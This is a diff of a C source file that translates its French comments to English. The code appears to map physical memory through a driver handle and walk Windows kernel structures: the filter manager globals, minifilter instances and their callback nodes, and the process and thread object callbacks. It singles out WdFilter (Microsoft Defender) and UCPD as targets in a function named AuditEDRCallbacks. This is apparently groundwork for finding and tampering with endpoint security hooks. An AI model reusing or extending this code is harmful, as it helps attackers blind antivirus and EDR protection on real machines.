     UINT64 funcVA = GetMinifilterFuncAddress((CHAR*)"FLTMGR.sys", (CHAR*)"FltEnumerateFilters");
     if (!funcVA) {
         printf("[-] Could not find FltEnumerateFilters address.\n");
@@ -901,13 +876,13 @@ UINT64 FindFltFrame(UINT64 fltMgrBase, UINT64 cr3, BYTE* phys, UINT64 physSize) 
     printf("[*] Scanning FltEnumerateFilters for FltGlobals pattern...\n");
 
     UINT64 targetInstrVA = 0;
-    // On scanne les 400 premiers octets de la fonction
+    // Scan the first 400 bytes of the function body.
     for (int i = 0; i < 400; i++) {
         UINT64 currentVA = funcVA + i;
         UINT64 pa = VirtualToPhysical(cr3, currentVA, phys, physSize);
         if (!pa || pa + 3 >= physSize) continue;
 
-        // Motif : 48 8D 05 (LEA RAX, [RIP + displacement])
+        // Pattern: 48 8D 05 (LEA RAX, [RIP + displacement]).
         if (phys[pa] == 0x48 && phys[pa + 1] == 0x8D && phys[pa + 2] == 0x05) {
             targetInstrVA = currentVA;
             break;
@@ -919,27 +894,27 @@ UINT64 FindFltFrame(UINT64 fltMgrBase, UINT64 cr3, BYTE* phys, UINT64 physSize) 
         return 0;
     }
 
-    // Calcul de l'adresse pointée par l'instruction (RIP + Displacement + InstructionSize)
+    // Compute the address referenced by the RIP-relative instruction.
     UINT64 paOffset = VirtualToPhysical(cr3, targetInstrVA + 3, phys, physSize);
     INT32 displacement = *(INT32*)(&phys[paOffset]);
 
-    // L'instruction LEA fait 7 octets au total
+    // This LEA instruction is 7 bytes long.
     UINT64 framePtrVA = targetInstrVA + 7 + displacement;
 
-    // Lecture du pointeur pour obtenir l'adresse réelle de la structure
+    // Read the pointer to recover the real structure address.
     UINT64 fltFrameVA = ReadMemoryU64(phys, VirtualToPhysical(cr3, framePtrVA, phys, physSize), physSize);
 
-    // Selon l'instruction trouvée, on pointe parfois sur FltGlobals+8, on ajuste :
+    // Depending on the matched instruction, the pointer can reference FltGlobals+8.
     fltFrameVA -= 0x8;
 
     printf("[+] Successfully located FLT_FRAME at: 0x%llx\n", fltFrameVA);
     return fltFrameVA;
 }
 VOID AuditEDRCallbacks(UINT64 fltFrameVA, UINT64 cr3, BYTE* phys, UINT64 physSize) {
-    // Offsets dynamiques (Win11)
+    // Dynamic offsets observed on the target Windows 11 build.
     UINT64 offFilterList = 0x50;     // RegisteredFilters.rList
     UINT64 offInstanceList = 0x70;   // _FLT_FILTER.InstanceList
-    UINT64 offCallbackNodes = 0x180; // _FLT_INSTANCE.CallbackNodes (Vérifier via dt)
+    UINT64 offCallbackNodes = 0x180; // _FLT_INSTANCE.CallbackNodes, validate with dt.
 
     UINT64 filterListHead = fltFrameVA + offFilterList;
     UINT64 currFilterLink = ReadMemoryU64(phys, VirtualToPhysical(cr3, filterListHead, phys, physSize), physSize);
@@ -948,24 +923,24 @@ VOID AuditEDRCallbacks(UINT64 fltFrameVA, UINT64 cr3, BYTE* phys, UINT64 physSiz
         UINT64 filterStructVA = currFilterLink - 0x10;
         CHAR* name = GetMinifilterName(filterStructVA, cr3, phys, physSize);
 
-        // Si c'est un driver cible (UCPD, WdFilter, etc.)
+        // Process only selected target filters in this experimental path.
         if (name && (strstr(name, "UCPD") || strstr(name, "WdFilter"))) {
             printf("[!] Target Filter Found: %s at 0x%llx\n", name, filterStructVA);
 
-            // Descente dans les Instances
+            // Walk into the filter instance list.
             UINT64 instListHead = filterStructVA + offInstanceList + 8;
             UINT64 currInstLink = ReadMemoryU64(phys, VirtualToPhysical(cr3, instListHead, phys, physSize), physSize);
 
             while (currInstLink != instListHead && currInstLink != 0) {
-                UINT64 instStructVA = currInstLink - 0x10; // Offset classique _FLT_INSTANCE
+                UINT64 instStructVA = currInstLink - 0x10; // Common _FLT_INSTANCE link offset.
 
-                // Scan des CallbackNodes (IRP_MJ_CREATE, READ, etc.)
+                // Scan CallbackNodes for IRP_MJ_CREATE, READ, and related operations.
                 for (int j = 0; j < 50; j++) {
                     UINT64 callbackNodePtrVA = instStructVA + offCallbackNodes + (j * 8);
                     UINT64 callbackNodeAddr = ReadMemoryU64(phys, VirtualToPhysical(cr3, callbackNodePtrVA, phys, physSize), physSize);
 
                     if (callbackNodeAddr != 0) {
-                        // On a trouvé un point d'accroche (Callback)
+                        // A callback hook point was found.
                         RegisterFoundCallback(callbackNodeAddr, name, cr3, phys, physSize);
                     }
                 }
@@ -982,8 +957,8 @@ UINT64 FindFltGlobals(UINT64 fltMgrBase, UINT64 cr3, BYTE* phys, UINT64 physSize
 
     printf("[*] Scanning FltEnumerateFilters @ 0x%llx\n", funcVA);
 
-    // --- DIAGNOSTIC DE LECTURE ---
-    printf("[DBG] Dump des 16 premiers octets de la fonction :\n");
+    // --- READ DIAGNOSTIC ---
+    printf("[DBG] Dumping the first 16 bytes of the function:\n");
     for (int j = 0; j < 16; j++) {
         UINT64 pa = VirtualToPhysical(cr3, funcVA + j, phys, physSize);
         if (pa && pa < physSize)
@@ -998,13 +973,13 @@ UINT64 FindFltGlobals(UINT64 fltMgrBase, UINT64 cr3, BYTE* phys, UINT64 physSize
         UINT64 pa = VirtualToPhysical(cr3, va, phys, physSize);
         if (!pa || pa + 7 >= physSize) continue;
 
-        // Pattern LEA (48 8D 05 ou 48 8D 0D)
+        // LEA pattern: 48 8D 05 or 48 8D 0D.
         if (phys[pa] == 0x48 && phys[pa + 1] == 0x8D && (phys[pa + 2] == 0x05 || phys[pa + 2] == 0x0D)) {
             INT32 displacement = *(INT32*)(&phys[pa + 3]);
             UINT64 targetVA = va + 7 + (INT64)displacement;
 
-            // Masque 0xFFF pour ignorer l'ASLR (on garde l'offset de page)
-            // Dans ton dump : 0x880 (+0xC0) ou 0x818 (+0x58)
+            // Mask with 0xFFF to ignore ASLR and compare only the page offset.
+            // Observed dump values: 0x880 (+0xC0) or 0x818 (+0x58).
             if ((targetVA & 0xFFF) == 0x880) {
                 printf("[+] Found FltGlobals via FrameList Offset (0xC0) @ 0x%llx\n", targetVA - 0xC0);
                 return targetVA - 0xC0;
@@ -1016,18 +991,18 @@ UINT64 FindFltGlobals(UINT64 fltMgrBase, UINT64 cr3, BYTE* phys, UINT64 physSize
         }
     }
 
-    printf("[-] Aucun motif LEA correspondant aux offsets connus n'a été trouvé.\n");
+    printf("[-] No LEA pattern matched the known offsets.\n");
     return 0;
 }
 
-// Fonction pour lire une chaîne Unicode (UTF-16) depuis la mémoire physique
+// Reads a UTF-16 string from mapped physical memory and prints an ASCII approximation.
 void PrintUnicodeString(UINT64 va, USHORT len, UINT64 cr3, BYTE* phys, UINT64 physSize) {
     if (len == 0 || len > 512) return;
 
     for (int i = 0; i < len; i += 2) {
         UINT64 pa = VirtualToPhysical(cr3, va + i, phys, physSize);
         if (pa && pa < physSize) {
-            char c = (char)phys[pa]; // On simplifie l'affichage en ASCII
+            char c = (char)phys[pa]; // Simplify display by keeping only the low ASCII byte.
             if (c >= 32 && c <= 126) printf("%c", c);
             else printf(".");
         }
@@ -1041,33 +1016,33 @@ void DisplayMinifilters(UINT64 fltGlobalsBase, UINT64 cr3, BYTE* phys, UINT64 ph
     printf(" Registered MiniFilter Drivers :\n");
     printf("----------------------------------------------------\n");
 
-    // 1. Accéder à la liste des Frames (FltGlobals + 0xC0)
+    // Access the frame list at FltGlobals + 0xC0.
     UINT64 frameListHead = fltGlobalsBase + 0xC0;
     UINT64 paFrameHead = VirtualToPhysical(cr3, frameListHead, phys, physSize);
     if (!paFrameHead) return;
 
-    // Lire le premier Frame (Flink)
+    // Read the first frame through Flink.
     UINT64 currentFrameLink = *(UINT64*)(&phys[paFrameHead]);
 
-    // Boucle sur les Frames (souvent un seul, mais soyons rigoureux)
+    // Walk frames. Most systems expose one frame, but keep the logic generic.
     while (currentFrameLink != 0 && currentFrameLink != frameListHead) {
-        // Dans FLTP_FRAME, le champ Links est à l'offset 0x08
+        // In FLTP_FRAME, Links is expected at offset 0x08.
         UINT64 frameAddr = currentFrameLink - 0x08;
 
-        // 2. Accéder à la liste des Filtres dans ce Frame (Offset 0xA8 d'après ton dump)
+        // Access this frame's filter list. Offset 0xA8 is based on the target dump.
         UINT64 filterListHead = frameAddr + 0xA8;
         UINT64 paFilterHead = VirtualToPhysical(cr3, filterListHead, phys, physSize);
         if (!paFilterHead) break;
 
         UINT64 currentFilterLink = *(UINT64*)(&phys[paFilterHead]);
 
-        // 3. Boucle sur les Filtres
+        //  Walk filters.
         int filterCount = 0;
         while (currentFilterLink != 0 && currentFilterLink != filterListHead) {
-            // Dans FLT_FILTER, PrimaryLink est à l'offset 0x10
+            // In FLT_FILTER, PrimaryLink is expected at offset 0x10.
             UINT64 filterAddr = currentFilterLink - 0x10;
 
-            // 4. Lire le nom du filtre (UNICODE_STRING à l'offset 0x18)
+            // Read the filter name. It is represented as a UNICODE_STRING at offset 0x18.
             // Offset 0x18: Length (2 bytes)
             // Offset 0x1A: MaximumLength (2 bytes)
             // Offset 0x20: Buffer (Pointer 8 bytes)
@@ -1082,15 +1057,15 @@ void DisplayMinifilters(UINT64 fltGlobalsBase, UINT64 cr3, BYTE* phys, UINT64 ph
                 printf("\n");
             }
 
-            // Passer au filtre suivant (Flink est à l'offset 0x00 du Link actuel)
+            // Move to the next filter. Flink is at offset 0x00 of the current link.
             UINT64 paNextLink = VirtualToPhysical(cr3, currentFilterLink, phys, physSize);
             if (!paNextLink) break;
             currentFilterLink = *(UINT64*)(&phys[paNextLink]);
 
-            if (filterCount > 100) break; // Sécurité
+            if (filterCount > 100) break; // Safety bound for corrupted or unexpected lists.
         }
 
-        // Passer au Frame suivant
+        // Move to the next frame.
         UINT64 paNextFrame = VirtualToPhysical(cr3, currentFrameLink, phys, physSize);
         if (!paNextFrame) break;
         currentFrameLink = *(UINT64*)(&phys[paNextFrame]);
@@ -1158,7 +1133,7 @@ int main()
     BYTE* phys = (BYTE*)req->outPtr;
     UINT64 physSize = req->size;
 
-    printf("[+] Physical Memory Mapped  0x%llx (size = 0x%llx)\n", phys, physSize);
+    printf("[+] Physical Memory Mapped  0x%llx (size = 0x%llx)\n", (UINT64)phys, physSize);
 
     UINT64 halpAddr = 0;
     UINT64 halOffset = 0;
@@ -1194,7 +1169,7 @@ int main()
         if ((q_value & 0xFFFF) == (halpAddr & 0xFFFF)) {
             printf("[+] HalpLMstub = 0x%llx\n", q_value);
             halpAddr = q_value;
-            //printf("[+] Physique offset =  0x%llx\n", physOffset);
+            //printf("[+] Physical offset =  0x%llx\n", physOffset);
             break;
         }
     }
@@ -1263,14 +1238,14 @@ int main()
         printf("--------------------------------------------------------------------\n");
 
         for (int i = 0; i < 2; i++) {
-            // Utilisation correcte du flag (1 puis 2)
+            // Use the expected flag values: 1 for process, 2 for thread.
             UINT64 typeStructVA = GetObjectTypeAddrByScan(hNtos, kernelBase, cr3, phys, physSize, scanTargets[i].flag);
 
             if (typeStructVA) {
                 printf("\n[!] Analysis of ObCallbacks for %s\n", scanTargets[i].name);
                 printf("[+] Found structure VA: 0x%llx\n", typeStructVA);
 
-                // Appel de la fonction d'AFFICHAGE
+                // Display the decoded object callbacks.
                 AuditObRegisterCallbacks(typeStructVA, cr3, phys, physSize, 0);
             }
         }
@@ -1325,22 +1300,7 @@ int main()
         }
 
     }
-    //UINT64 fltGlobalsForce = 0xfffff8016655d7c0;
-    //DisplayMinifilters(fltGlobalsForce, cr3, phys, physSize);
-    //DisplayMinifilters(fltMgrBase, cr3, phys, physSize);
-    /*
-    UINT64 fltGlobals = FindFltGlobals(fltMgrBase, cr3, phys, physSize);
 
-    if (fltGlobals == NULL)
-        printf("[!] Finding Flt Globals failed !\n");
-
-    printf("[+] Flt Globals at : 0x%llx", fltGlobals);
-    
-    
-
-    
-    */
-    
   
     UnMapViewOfSection(hDev, req);
     free(req);
